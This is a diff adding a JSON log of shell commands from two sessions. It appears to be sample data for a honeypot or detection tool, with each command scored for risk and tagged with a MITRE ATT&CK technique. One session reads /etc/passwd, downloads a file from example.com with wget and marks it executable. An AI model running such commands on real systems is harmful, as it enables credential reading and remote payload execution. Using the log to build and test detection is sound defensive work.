@@ -1,0 +1,92 @@
+[
+  {
+    "timestamp": "2026-08-01T14:00:01Z",
+    "session": "A82391",
+    "source_ip": "10.0.2.15",
+    "command": "whoami",
+    "process": "whoami",
+    "risk": "LOW",
+    "score": 1,
+    "mitre": {"tactic": "Discovery", "technique": "T1083"}
+  },
+  {
+    "timestamp": "2026-08-01T14:00:04Z",
+    "session": "A82391",
+    "source_ip": "10.0.2.15",
+    "command": "uname -a",
+    "process": "uname",
+    "risk": "LOW",
+    "score": 1,
+    "mitre": {"tactic": "Discovery", "technique": "T1083"}
+  },
+  {
+    "timestamp": "2026-08-01T14:00:08Z",
+    "session": "A82391",
+    "source_ip": "10.0.2.15",
+    "command": "ls -l",
+    "process": "ls",
+    "risk": "LOW",
+    "score": 1,
+    "mitre": {"tactic": "Discovery", "technique": "T1083"}
+  },
+  {
+    "timestamp": "2026-08-01T14:00:13Z",
+    "session": "A82391",
+    "source_ip": "10.0.2.15",
+    "command": "cat /etc/passwd",
+    "process": "cat",
+    "risk": "MEDIUM",
+    "score": 5,
+    "mitre": {"tactic": "Credential Access", "technique": "T1003"}
+  },
+  {
+    "timestamp": "2026-08-01T14:00:20Z",
+    "session": "A82391",
+    "source_ip": "10.0.2.15",
+    "command": "wget http://example.com/file",
+    "process": "wget",
+    "risk": "HIGH",
+    "score": 8,
+    "mitre": {"tactic": "Command and Control", "technique": "T1105"}
+  },
+  {
+    "timestamp": "2026-08-01T14:00:28Z",
+    "session": "A82391",
+    "source_ip": "10.0.2.15",
+    "command": "chmod +x file",
+    "process": "chmod",
+    "risk": "HIGH",
+    "score": 7,
+    "mitre": {"tactic": "Persistence", "technique": "T1222"}
+  },
+  {
+    "timestamp": "2026-08-01T15:00:01Z",
+    "session": "B91244",
+    "source_ip": "10.0.2.20",
+    "command": "pwd",
+    "process": "pwd",
+    "risk": "LOW",
+    "score": 1,
+    "mitre": {"tactic": "Discovery", "technique": "T1083"}
+  },
+  {
+    "timestamp": "2026-08-01T15:00:05Z",
+    "session": "B91244",
+    "source_ip": "10.0.2.20",
+    "command": "ls",
+    "process": "ls",
+    "risk": "LOW",
+    "score": 1,
+    "mitre": {"tactic": "Discovery", "technique": "T1083"}
+  },
+  {
+    "timestamp": "2026-08-01T15:00:10Z",
+    "session": "B91244",
+    "source_ip": "10.0.2.20",
+    "command": "cd /tmp",
+    "process": "cd",
+    "risk": "LOW",
+    "score": 1,
+    "mitre": {"tactic": "Discovery", "technique": "T1083"}
+  }
+]
